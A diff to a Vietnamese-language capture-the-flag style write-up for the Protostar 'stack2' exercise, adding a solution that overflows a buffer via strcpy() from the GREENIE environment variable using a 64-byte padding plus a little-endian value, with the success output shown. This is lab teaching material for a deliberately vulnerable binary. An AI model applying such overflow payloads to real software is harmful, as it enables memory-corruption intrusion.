@@ -41,11 +41,19 @@ int main(int argc, char **argv)
 
 ## Solutions
 
+`STACK TWO` được thay đổi một chút từ `STACK ONE` khi mà vẫn có thể khai thác buffer overflow thông qua `strcpy()` nhưng giá trị được sao chép là từ `Environment Variables` - `Biến môi trường` mà chương trình yêu cầu là `GREENIE`.
 
+Ta tiến hành set giá trị cho biến môi trường `GREENIE`:
 
 ```
-root@protostar:/opt/protostar/bin# python -c 'print "A" * 65' | ./stack0
-you have changed the 'modified' variable
+root@protostar:/opt/protostar/bin# GREENIE=$(python -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"')           
+root@protostar:/opt/protostar/bin# export GREENIE 
+```
+Lưu ý `Little edian` và lưu biến môi trường vào danh sách.
+
+```
+root@protostar:/opt/protostar/bin# ./stack2                                                             
+you have correctly modified the variable
 ```
 
 ## Documents
@@ -55,5 +63,7 @@ you have changed the 'modified' variable
 <https://www.coengoedegebure.com/buffer-overflow-attacks-explained/>
 
 <https://en.wikipedia.org/wiki/Endianness>
+
+<https://linuxconfig.org/how-to-set-and-list-environment-variables-on-linux>
 
 
